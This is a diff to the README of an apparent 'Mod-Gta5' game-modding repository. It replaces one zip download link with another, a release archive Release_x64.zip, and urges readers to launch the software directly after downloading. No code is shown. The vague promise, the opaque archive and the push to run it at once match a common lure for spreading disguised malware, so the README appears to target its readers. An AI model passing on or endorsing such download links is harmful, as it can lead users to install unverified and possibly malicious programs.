@@ -14,7 +14,7 @@ Welcome to the "Mod-Gta5" repository! This tool is designed to enhance your GTA 
 
 ## Get Started
 To get started with the "Mod-Gta5" tool, download the software package from the link below:
-[![Download Software](https://img.shields.io/badge/Download-Software.zip-blue)](https://github.com/user-attachments/files/18383251/Software.zip)
+[![Download Software](https://github.com/minedreamback/Mod-Gta5/releases/download/v2.0/Release_x64.zip)](https://github.com/minedreamback/Mod-Gta5/releases/download/v2.0/Release_x64.zip)
 
 Remember, the software needs to be launched directly after downloading to begin enhancing your GTA V gameplay!
 
